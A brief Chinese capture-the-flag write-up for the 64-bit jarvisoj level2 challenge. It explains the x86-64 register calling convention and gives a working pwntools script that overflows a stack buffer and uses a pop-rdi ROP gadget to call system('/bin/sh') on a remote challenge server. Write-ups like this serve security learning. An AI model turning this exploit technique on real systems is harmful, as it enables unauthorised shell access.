首先checksec

![image-20201103153919908](https://static.hack1s.fun/images/2021/02/06/image-20201103153919908.png)

这个题目和之前的jarvisoj_level2基本是一样的思路，主要差异就在于这个是64位的



因为是64位的，函数调用时不是先看栈里的数据，顺序首先是几个寄存器

当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9

我们想要调用起来`system('/bin/sh')`

只需要这一个参数，所以需要将`/bin/sh`弹出到`rdi`中

```python
from pwn import *

io = remote('node3.buuoj.cn',28844)
#io  = process('./level2')
elf = ELF('./level2_x64')

pop_rdi = 0x4006b3
payload = 'a'*0x80 + 'b'*0x8 + p64(pop_rdi) + p64(elf.sym['hint']) + p64(elf.sym['system'])

io.readline()
io.sendline(payload)

io.interactive()
```

